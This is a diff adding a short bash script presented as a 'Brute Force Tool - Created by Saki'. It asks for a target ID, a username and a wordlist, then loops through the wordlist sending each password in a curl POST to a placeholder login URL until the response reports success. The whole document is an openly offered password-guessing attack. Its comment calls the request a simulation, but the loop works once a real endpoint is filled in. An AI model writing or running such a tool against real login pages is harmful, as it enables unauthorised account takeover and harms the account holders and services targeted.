@@ -1,0 +1,45 @@
+#!/bin/bash
+
+# Banner
+clear
+echo "==============================================="
+echo "   🔐 Brute Force Tool - Created by Saki 🔐"
+echo "==============================================="
+echo ""
+
+# Prompt for user input
+read -p "➡️  Enter Target ID: " TARGET_ID
+read -p "➡️  Enter Target Username: " TARGET_USERNAME
+read -p "➡️  Enter Wordlist File: " WORDLIST
+
+# Check if wordlist file exists
+if [ ! -f "$WORDLIST" ]; then
+    echo "❌ Error: Wordlist file '$WORDLIST' not found!"
+    exit 1
+fi
+
+echo ""
+echo "Starting brute force attack..."
+echo "Target ID: $TARGET_ID"
+echo "Target Username: $TARGET_USERNAME"
+echo "==============================================="
+
+# Read and process the wordlist
+while read -r PASSWORD; do
+    echo "🔍 Trying password: $PASSWORD"
+    
+    # Simulating a login attempt (replace this with actual logic)
+    RESPONSE=$(curl -s -X POST -d "id=$TARGET_ID&username=$TARGET_USERNAME&password=$PASSWORD" http://example.com/login)
+
+    if [[ "$RESPONSE" == *"Login successful"* ]]; then
+        echo "==============================================="
+        echo "🎉 Password found: $PASSWORD"
+        echo "==============================================="
+        exit 0
+    fi
+done < "$WORDLIST"
+
+echo "==============================================="
+echo "❌ Password not found in the wordlist."
+echo "==============================================="
+exit 1
